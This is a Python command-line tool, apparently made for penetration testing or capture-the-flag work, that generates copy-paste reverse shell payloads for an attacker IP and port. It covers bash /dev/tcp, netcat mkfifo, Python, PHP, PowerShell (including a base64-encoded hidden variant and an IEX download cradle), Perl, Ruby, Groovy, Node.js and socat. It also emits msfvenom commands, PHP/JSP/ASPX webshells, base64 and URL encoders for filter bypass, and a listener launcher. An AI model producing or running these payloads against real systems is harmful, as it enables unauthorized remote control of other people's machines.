#!/usr/bin/env python3
"""
Reverse Shell Factory — instant payload generation for every situation.

Generates copy-paste-ready reverse shells in 15+ languages with
optional encoding for filter bypass. Also prints TTY stabilization
steps and can launch a listener for you.

No dependencies beyond Python 3.6+ stdlib.
"""

import argparse
import base64
import shlex
import subprocess
import sys
import textwrap
import urllib.parse
import os
import socket

# ───────────────── ANSI helpers ───────────────────────────

def _has_color():
    return hasattr(sys.stdout, "isatty") and sys.stdout.isatty()

_C = _has_color()

def _a(code, t): return f"\033[{code}m{t}\033[0m" if _C else t
def red(t):     return _a("91", t)
def green(t):   return _a("92", t)
def yellow(t):  return _a("93", t)
def blue(t):    return _a("94", t)
def magenta(t): return _a("95", t)
def cyan(t):    return _a("96", t)
def bold(t):    return _a("1", t)
def dim(t):     return _a("2", t)

BANNER = f"""
{cyan('    __  ____  _______ __ ____  __')}
{cyan('   / / / / / / / ___// //_/')}\\{cyan(' \\ \\/ /')}
{cyan('  / /_/ / / / /\\__ \\/ ,<')}   {cyan(' \\  /')}
{cyan(' / __  / /_/ /___/ / /| |')}  {cyan(' / /')}
{cyan('/_/ /_/\\____//____/_/ |_|')} {cyan('/_/')}
{red('    __  _____   ________ __ __________')}
{red('   / / / /   | / ____/ //_// ____/ __ \\\\')}
{red('  / /_/ / /| |/ /   / ,<  / __/ / /_/ /')}
{red(' / __  / ___ / /___/ /| |/ /___/ _, _/')}
{red('/_/ /_/_/  |_\\____/_/ |_/_____/_/ |_|')}

    {bold('R E V S H E L L   F A C T O R Y')}
    {dim('Instant payloads. Zero fumbling.')}
"""

# ──────────────── shell templates ─────────────────────────
#
# Each template is a function(ip, port) -> str so complex ones
# can do conditional logic. Simple ones are lambdas over format().

SHELLS = {}

def shell(name, *aliases, lang=None, note=None):
    """Decorator to register a shell generator."""
    def wrapper(fn):
        entry = {"fn": fn, "aliases": list(aliases), "lang": lang or name, "note": note or ""}
        SHELLS[name] = entry
        for a in aliases:
            SHELLS[a] = entry
        return fn
    return wrapper


# ── Bash ──

@shell("bash", "sh", lang="bash", note="Most common on Linux targets")
def _(ip, port):
    return f"bash -i >& /dev/tcp/{ip}/{port} 0>&1"

@shell("bash-196", lang="bash", note="Bash /dev/tcp with file descriptor 196")
def _(ip, port):
    return f"0<&196;exec 196<>/dev/tcp/{ip}/{port}; bash <&196 >&196 2>&196"

@shell("bash-udp", lang="bash", note="Bash reverse shell over UDP")
def _(ip, port):
    return f"bash -i >& /dev/udp/{ip}/{port} 0>&1"

@shell("bash-readline", lang="bash", note="Uses /dev/tcp with read loop")
def _(ip, port):
    return (
        f"exec 5<>/dev/tcp/{ip}/{port}; "
        f"while read line 0<&5; do $line 2>&5 >&5; done"
    )


# ── Netcat ──

@shell("nc", "netcat", lang="netcat", note="Traditional netcat -e")
def _(ip, port):
    return f"nc -e /bin/bash {ip} {port}"

@shell("nc-mkfifo", "nc-fifo", lang="netcat", note="Named pipe — works when -e is unavailable")
def _(ip, port):
    return f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc {ip} {port} >/tmp/f"

@shell("nc-c", lang="netcat", note="Netcat -c flag variant")
def _(ip, port):
    return f"nc -c /bin/bash {ip} {port}"

@shell("ncat", lang="ncat", note="Nmap's ncat with -e")
def _(ip, port):
    return f"ncat -e /bin/bash {ip} {port}"

@shell("busybox-nc", "busybox", lang="busybox", note="BusyBox netcat (common in containers/IoT)")
def _(ip, port):
    return f"busybox nc {ip} {port} -e /bin/bash"


# ── Python ──

@shell("python", "py", "python3", lang="python", note="Python3 PTY reverse shell")
def _(ip, port):
    return (
        f'python3 -c \'import socket,subprocess,os;'
        f"s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);"
        f's.connect(("{ip}",{port}));'
        f"os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);"
        f"subprocess.call([\"/bin/bash\",\"-i\"])'"
    )

@shell("python-short", "py-short", lang="python", note="Shortest Python reverse shell")
def _(ip, port):
    return (
        f"python3 -c 'import os,pty,socket;"
        f"s=socket.socket();"
        f's.connect(("{ip}",{port}));'
        f"[os.dup2(s.fileno(),f)for f in(0,1,2)];"
        f"pty.spawn(\"/bin/bash\")'"
    )

@shell("python-windows", "py-win", lang="python", note="Python for Windows targets")
def _(ip, port):
    return (
        f'python -c \'import socket,subprocess;'
        f"s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);"
        f's.connect(("{ip}",{port}));'
        f'subprocess.call(["cmd.exe"],stdin=s,stdout=s,stderr=s)\''
    )


# ── PHP ──

@shell("php", lang="php", note="PHP exec reverse shell")
def _(ip, port):
    return (
        f"php -r '$sock=fsockopen(\"{ip}\",{port});"
        f"exec(\"/bin/bash <&3 >&3 2>&3\");'"
    )

@shell("php-cmd", lang="php", note="PHP system() one-liner for webshells")
def _(ip, port):
    return f"php -r '$sock=fsockopen(\"{ip}\",{port});shell_exec(\"/bin/bash <&3 >&3 2>&3\");'"

@shell("php-pentestmonkey", "php-pm", lang="php", note="Classic PentestMonkey PHP reverse shell (inline)")
def _(ip, port):
    return (
        f"php -r '$sock=fsockopen(\"{ip}\",{port});"
        f"$proc=proc_open(\"/bin/bash\",array(0=>$sock,1=>$sock,2=>$sock),$pipes);'"
    )


# ── PowerShell ──

@shell("powershell", "ps", "psh", lang="powershell", note="PowerShell TCP client reverse shell")
def _(ip, port):
    return (
        f"powershell -nop -W hidden -noni -ep bypass -c \""
        f"$TCPClient = New-Object Net.Sockets.TCPClient('{ip}', {port});"
        f"$StreamWriter = New-Object IO.StreamWriter($TCPClient.GetStream());"
        f"[byte[]]$bytes = 0..65535|%{{0}};"
        f"while(($i = $TCPClient.GetStream().Read($bytes, 0, $bytes.Length)) -ne 0)"
        f"{{$data = (New-Object Text.ASCIIEncoding).GetString($bytes,0,$i);"
        f"$sendback = (iex $data 2>&1 | Out-String);"
        f"$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';"
        f"$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);"
        f"$TCPClient.GetStream().Write($sendbyte,0,$sendbyte.Length);"
        f"$TCPClient.GetStream().Flush()}};"
        f"$TCPClient.Close()\""
    )

@shell("powershell-b64", "ps-b64", lang="powershell", note="Base64-encoded PowerShell reverse shell")
def _(ip, port):
    # Build the raw PS script, then encode it
    raw = (
        f"$client = New-Object System.Net.Sockets.TCPClient('{ip}',{port});"
        f"$stream = $client.GetStream();"
        f"[byte[]]$bytes = 0..65535|%{{0}};"
        f"while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)"
        f"{{$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);"
        f"$sendback = (iex $data 2>&1 | Out-String );"
        f"$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';"
        f"$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);"
        f"$stream.Write($sendbyte,0,$sendbyte.Length);"
        f"$stream.Flush()}};"
        f"$client.Close()"
    )
    encoded = base64.b64encode(raw.encode("utf-16-le")).decode()
    return f"powershell -nop -W hidden -ep bypass -enc {encoded}"

@shell("powercat", lang="powershell", note="Powercat reverse shell (needs powercat.ps1 loaded)")
def _(ip, port):
    return f"powershell -c \"IEX(New-Object System.Net.WebClient).DownloadString('http://{ip}/powercat.ps1');powercat -c {ip} -p {port} -e cmd\""


# ── Perl ──

@shell("perl", lang="perl", note="Perl reverse shell")
def _(ip, port):
    return (
        f"perl -e 'use Socket;"
        f'$i="{ip}";$p={port};'
        f"socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));"
        f"if(connect(S,sockaddr_in($p,inet_aton($i))))"
        f"{{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");"
        f"exec(\"/bin/bash -i\")}};'"
    )


# ── Ruby ──

@shell("ruby", "rb", lang="ruby", note="Ruby reverse shell")
def _(ip, port):
    return (
        f"ruby -rsocket -e'"
        f"f=TCPSocket.open(\"{ip}\",{port}).to_i;"
        f"exec sprintf(\"/bin/bash -i <&%d >&%d 2>&%d\",f,f,f)'"
    )


# ── Java / Groovy ──

@shell("java", lang="java", note="Java Runtime.exec reverse shell")
def _(ip, port):
    return (
        f'r = Runtime.getRuntime()\n'
        f'p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/{ip}/{port};'
        f'cat <&5 | while read line; do \\$line 2>&5 >&5; done"] as String[])\n'
        f'p.waitFor()'
    )

@shell("groovy", lang="groovy", note="Groovy reverse shell (Jenkins/Liferay script consoles)")
def _(ip, port):
    return (
        f'String host="{ip}";\n'
        f"int port={port};\n"
        f'String cmd="/bin/bash";\n'
        f"Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();\n"
        f"Socket s=new Socket(host,port);\n"
        f"InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();\n"
        f"OutputStream po=p.getOutputStream(),so=s.getOutputStream();\n"
        f"while(!s.isClosed()){{while(pi.available()>0)so.write(pi.read());\n"
        f"while(pe.available()>0)so.write(pe.read());\n"
        f"while(si.available()>0)po.write(si.read());\n"
        f"so.flush();po.flush();Thread.sleep(50);\n"
        f"try {{p.exitValue();break;}}catch(Exception e){{}}}}\n"
        f"p.destroy();s.close();"
    )


# ── Lua ──

@shell("lua", lang="lua", note="Lua reverse shell")
def _(ip, port):
    return (
        f"lua -e \"require('socket');"
        f"require('os');"
        f"t=socket.tcp();"
        f"t:connect('{ip}','{port}');"
        f"os.execute('/bin/bash -i <&3 >&3 2>&3');\""
    )


# ── Socat ──

@shell("socat", lang="socat", note="Socat reverse shell with full TTY")
def _(ip, port):
    return f"socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:{ip}:{port}"

@shell("socat-listener", lang="socat", note="Matching socat listener (run on attacker)")
def _(ip, port):
    return f"socat file:`tty`,raw,echo=0 tcp-listen:{port}"


# ── Xterm ──

@shell("xterm", lang="xterm", note="Xterm reverse (needs X11, run 'xhost +target' and 'Xnest :1' first)")
def _(ip, port):
    return f"xterm -display {ip}:1"


# ── Node.js ──

@shell("node", "nodejs", lang="node.js", note="Node.js reverse shell")
def _(ip, port):
    return (
        f"require('child_process').exec('bash -c \"bash -i >& /dev/tcp/{ip}/{port} 0>&1\"')"
    )

@shell("node-net", lang="node.js", note="Node.js using net module")
def _(ip, port):
    return (
        f"(function(){{var net=require('net'),cp=require('child_process'),sh=cp.spawn('/bin/bash',[]);"
        f"var client=new net.Socket();"
        f"client.connect({port},'{ip}',function(){{client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);}});"
        f"return /a/;}})()"
    )


# ── msfvenom shortcuts ──

@shell("msfvenom-linux", "msf-linux", lang="msfvenom", note="msfvenom linux/x64 staged meterpreter (copy-paste)")
def _(ip, port):
    return f"msfvenom -p linux/x64/shell_reverse_tcp LHOST={ip} LPORT={port} -f elf -o rev.elf"

@shell("msfvenom-windows", "msf-win", lang="msfvenom", note="msfvenom windows/x64 reverse shell exe")
def _(ip, port):
    return f"msfvenom -p windows/x64/shell_reverse_tcp LHOST={ip} LPORT={port} -f exe -o rev.exe"

@shell("msfvenom-aspx", "msf-aspx", lang="msfvenom", note="msfvenom ASPX webshell payload")
def _(ip, port):
    return f"msfvenom -p windows/x64/shell_reverse_tcp LHOST={ip} LPORT={port} -f aspx -o rev.aspx"

@shell("msfvenom-war", "msf-war", lang="msfvenom", note="msfvenom WAR payload (Tomcat)")
def _(ip, port):
    return f"msfvenom -p java/jsp_shell_reverse_tcp LHOST={ip} LPORT={port} -f war -o rev.war"

@shell("msfvenom-php", "msf-php", lang="msfvenom", note="msfvenom PHP payload")
def _(ip, port):
    return f"msfvenom -p php/reverse_php LHOST={ip} LPORT={port} -f raw -o rev.php"

@shell("msfvenom-python", "msf-py", lang="msfvenom", note="msfvenom Python payload")
def _(ip, port):
    return f"msfvenom -p cmd/unix/reverse_python LHOST={ip} LPORT={port} -f raw"

@shell("msfvenom-dll", "msf-dll", lang="msfvenom", note="msfvenom DLL payload (service hijacks)")
def _(ip, port):
    return f"msfvenom -p windows/x64/shell_reverse_tcp LHOST={ip} LPORT={port} -f dll -o rev.dll"


# ── Webshells (not reverse but handy) ──

@shell("webshell-php", "ws-php", lang="php-webshell", note="Tiny PHP webshell (GET param 'c')")
def _(ip, port):
    return "<?php system($_GET['c']); ?>"

@shell("webshell-jsp", "ws-jsp", lang="jsp-webshell", note="JSP webshell")
def _(ip, port):
    return (
        '<%@ page import="java.util.*,java.io.*"%>\n'
        "<%\n"
        'String cmd = request.getParameter("c");\n'
        "if (cmd != null) {\n"
        "  Process p = Runtime.getRuntime().exec(cmd);\n"
        "  BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));\n"
        "  String line;\n"
        "  while ((line = br.readLine()) != null) out.println(line);\n"
        "}\n"
        "%>"
    )

@shell("webshell-aspx", "ws-aspx", lang="aspx-webshell", note="ASPX webshell")
def _(ip, port):
    return (
        '<%@ Page Language="C#" %>\n'
        '<%@ Import Namespace="System.Diagnostics" %>\n'
        "<%\n"
        'string cmd = Request["c"];\n'
        "if (cmd != null) {\n"
        '  Process p = new Process();\n'
        '  p.StartInfo.FileName = "cmd.exe";\n'
        '  p.StartInfo.Arguments = "/c " + cmd;\n'
        "  p.StartInfo.UseShellExecute = false;\n"
        "  p.StartInfo.RedirectStandardOutput = true;\n"
        "  p.Start();\n"
        "  Response.Write(p.StandardOutput.ReadToEnd());\n"
        "}\n"
        "%>"
    )


# ──────────────── encoding functions ──────────────────────

def encode_base64(payload):
    return base64.b64encode(payload.encode()).decode()

def encode_url(payload):
    return urllib.parse.quote(payload, safe="")

def encode_double_url(payload):
    return urllib.parse.quote(urllib.parse.quote(payload, safe=""), safe="")

def encode_hex(payload):
    return payload.encode().hex()

def wrap_bash_b64(payload):
    """Wraps a bash payload in echo | base64 -d | bash for filter bypass."""
    b = base64.b64encode(payload.encode()).decode()
    return f"echo {b} | base64 -d | bash"

def wrap_python_b64(payload_inner, ip, port):
    """Wraps python code in a base64 exec() wrapper."""
    # Extract the raw python from between -c ' and trailing '
    raw = (
        f"import socket,subprocess,os;"
        f"s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);"
        f's.connect(("{ip}",{port}));'
        f"os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);"
        f'subprocess.call(["/bin/bash","-i"])'
    )
    b = base64.b64encode(raw.encode()).decode()
    return f"python3 -c 'import base64;exec(base64.b64decode(\"{b}\"))'"

ENCODERS = {
    "base64": encode_base64,
    "b64": encode_base64,
    "url": encode_url,
    "double-url": encode_double_url,
    "durl": encode_double_url,
    "hex": encode_hex,
}


# ──────────────── TTY stabilization ───────────────────────

STABILIZE_STEPS = f"""
{bold(cyan('─── TTY Stabilization ───'))}

  {bold('Method 1: Python PTY (most common)')}
    {green('python3 -c \'import pty;pty.spawn("/bin/bash")\'')}
    {dim('Then:')}  Ctrl+Z
    {green('stty raw -echo; fg')}
    {green('export TERM=xterm-256color')}
    {green('stty rows 40 cols 160')}

  {bold('Method 2: script (if no python)')}
    {green('script -qc /bin/bash /dev/null')}
    {dim('Then:')}  Ctrl+Z
    {green('stty raw -echo; fg')}

  {bold('Method 3: rlwrap (use on listener side)')}
    {green('rlwrap nc -lvnp PORT')}

  {bold('Method 4: socat full TTY')}
    {dim('Listener:')}  {green('socat file:`tty`,raw,echo=0 tcp-listen:PORT')}
    {dim('Target:')}    {green('socat exec:"bash -li",pty,stderr,setsid,sigint,sane tcp:IP:PORT')}
"""


# ──────────────── auto-detect IP ──────────────────────────

def detect_ip():
    """Try to detect the attacker's tun0/eth0 IP."""
    for iface_hint in ["tun0", "eth0", "wlan0"]:
        try:
            import fcntl
            import struct
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            ip = socket.inet_ntoa(fcntl.ioctl(
                s.fileno(), 0x8915,
                struct.pack("256s", iface_hint.encode()[:15])
            )[20:24])
            if ip and not ip.startswith("127."):
                return ip, iface_hint
        except Exception:
            continue
    # Fallback: connect to external and read local addr
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("10.255.255.255", 1))
        ip = s.getsockname()[0]
        s.close()
        return ip, "auto"
    except Exception:
        return None, None


# ──────────────── CLI ─────────────────────────────────────

def list_shells():
    """Print all available shell types."""
    print(f"\n{bold(cyan('Available shell types:'))}\n")
    seen = set()
    categories = {}
    for name, entry in SHELLS.items():
        fn_id = id(entry["fn"])
        if fn_id in seen:
            continue
        seen.add(fn_id)
        lang = entry["lang"]
        if lang not in categories:
            categories[lang] = []
        aliases = [a for a in entry["aliases"] if a != name]
        alias_str = f" ({dim(', '.join(aliases))})" if aliases else ""
        categories[lang].append(f"    {green(name)}{alias_str}  {dim(entry['note'])}")

    for lang, items in categories.items():
        print(f"  {bold(lang)}")
        for item in items:
            print(item)
    print()


def parse_args():
    p = argparse.ArgumentParser(
        description="Reverse Shell Factory — instant payload generation",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=textwrap.dedent("""\
            Examples:
              revshell -l bash -i 10.10.15.110 -p 4444
              revshell -l python -i 10.10.15.110 -p 9001 --encode base64
              revshell -l nc-mkfifo -i 10.10.15.110 -p 443 --wrap-b64
              revshell -l powershell-b64 -i 10.10.15.110 -p 4444
              revshell -l msfvenom-linux -i 10.10.15.110 -p 4444
              revshell --list
              revshell --stabilize
              revshell --listen -p 4444
              revshell --all -i 10.10.15.110 -p 4444
        """),
    )
    p.add_argument("-l", "--lang", help="Shell type (see --list)")
    p.add_argument("-i", "--ip", help="Attacker IP (auto-detects tun0 if omitted)")
    p.add_argument("-p", "--port", type=int, default=4444, help="Attacker port (default: 4444)")
    p.add_argument("--encode", choices=["base64", "b64", "url", "double-url", "durl", "hex"],
                   help="Encode the payload")
    p.add_argument("--wrap-b64", action="store_true",
                   help="Wrap bash payload in echo|base64 -d|bash")
    p.add_argument("--list", action="store_true", help="List all available shell types")
    p.add_argument("--all", action="store_true",
                   help="Print ALL shell types for the given IP/port")
    p.add_argument("--stabilize", "--stable", action="store_true",
                   help="Print TTY stabilization cheatsheet")
    p.add_argument("--listen", action="store_true",
                   help="Start a nc listener on the specified port")
    p.add_argument("--rlwrap", action="store_true",
                   help="Use rlwrap with the listener")
    return p.parse_args()


def main():
    args = parse_args()

    # ── List mode ──
    if args.list:
        print(BANNER)
        list_shells()
        return

    # ── Stabilize mode ──
    if args.stabilize:
        print(STABILIZE_STEPS)
        return

    # ── Resolve IP ──
    ip = args.ip
    if not ip:
        ip, iface = detect_ip()
        if ip:
            print(f"  {dim(f'Auto-detected IP: {ip} ({iface})')}")
        else:
            print(f"  {red('[!]')} Could not detect IP — use -i to specify")
            sys.exit(1)

    port = args.port

    # ── Listener mode ──
    if args.listen:
        print(f"\n  {cyan('[*]')} Starting listener on port {bold(str(port))}...")
        print(f"  {dim('Ctrl+C to stop')}\n")
        cmd = ["rlwrap", "nc", "-lvnp", str(port)] if args.rlwrap else ["nc", "-lvnp", str(port)]
        try:
            os.execvp(cmd[0], cmd)
        except FileNotFoundError:
            # Fallback if rlwrap not found
            cmd = ["nc", "-lvnp", str(port)]
            os.execvp(cmd[0], cmd)

    # ── All mode ──
    if args.all:
        print(BANNER)
        print(f"  {bold('Target:')} {ip}:{port}\n")
        seen = set()
        for name, entry in SHELLS.items():
            fn_id = id(entry["fn"])
            if fn_id in seen:
                continue
            seen.add(fn_id)
            payload = entry["fn"](ip, port)
            aliases = [a for a in entry["aliases"] if a != name]
            print(f"  {bold(green(name))} {dim(entry['note'])}")
            print(f"  {yellow(payload)}")
            print()
        return

    # ── Single shell mode ──
    if not args.lang:
        print(BANNER)
        print(f"  Usage: revshell -l <type> -i <ip> -p <port>")
        print(f"  Run {bold('revshell --list')} to see all types\n")
        # Show a few popular ones as a quick reference
        print(f"  {bold('Quick picks:')}")
        quick = ["bash", "nc-mkfifo", "python", "php", "powershell", "busybox-nc", "socat"]
        for name in quick:
            entry = SHELLS[name]
            payload = entry["fn"](ip, port)
            print(f"\n    {bold(green(name))} {dim(entry['note'])}")
            print(f"    {payload}")
        print(f"\n  {dim(f'Showing for {ip}:{port} — use -i/-p to change')}\n")
        return

    lang = args.lang.lower()
    if lang not in SHELLS:
        print(f"  {red('[!]')} Unknown shell type: {lang}")
        print(f"  {dim('Run --list to see available types')}")
        sys.exit(1)

    entry = SHELLS[lang]
    payload = entry["fn"](ip, port)

    # ── Encoding ──
    if args.wrap_b64 and entry["lang"] == "bash":
        payload = wrap_bash_b64(payload)
    elif args.wrap_b64 and entry["lang"] == "python":
        payload = wrap_python_b64(payload, ip, port)

    if args.encode:
        encoder = ENCODERS[args.encode]
        payload = encoder(payload)

    # ── Output ──
    print(f"\n  {bold(green(lang))} {dim(entry['note'])}")
    print(f"  {dim(f'{ip}:{port}')}\n")
    print(payload)

    # Helpful extras
    print(f"\n  {dim('─' * 50)}")
    print(f"  {bold('Listener:')} {cyan(f'nc -lvnp {port}')}")
    if args.rlwrap:
        print(f"  {bold('With rlwrap:')} {cyan(f'rlwrap nc -lvnp {port}')}")

    # If it's a bash shell, suggest the b64 wrap
    if entry["lang"] == "bash" and not args.wrap_b64 and not args.encode:
        b64_version = wrap_bash_b64(entry["fn"](ip, port))
        print(f"\n  {dim('Base64 wrapped (for filter bypass):')}")
        print(f"  {dim(b64_version)}")

    print()


if __name__ == "__main__":
    main()
